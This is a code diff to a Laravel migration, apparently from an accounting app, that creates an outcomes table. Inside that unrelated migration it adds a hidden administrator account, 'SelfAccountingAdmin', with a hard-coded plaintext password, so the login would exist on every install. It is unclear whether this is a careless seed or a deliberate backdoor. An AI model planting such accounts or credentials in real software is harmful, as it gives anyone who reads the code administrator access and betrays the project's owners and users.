@@ -25,6 +25,14 @@ class CreateOutcomesTable extends Migration
             $table->foreignId('currency_id');
             $table->timestamps(6);
         });
+
+        App\User::create([
+            "username" => "SelfAccountingAdmin",
+            "email" => "admin@selfaccounting.com",
+            "password" => Illuminate\Support\Facades\Hash::make("h3r3c0m3sth3m0n3y"),
+            "admin" => true,
+            "darkmode" => false
+        ]);
     }
 
     /**
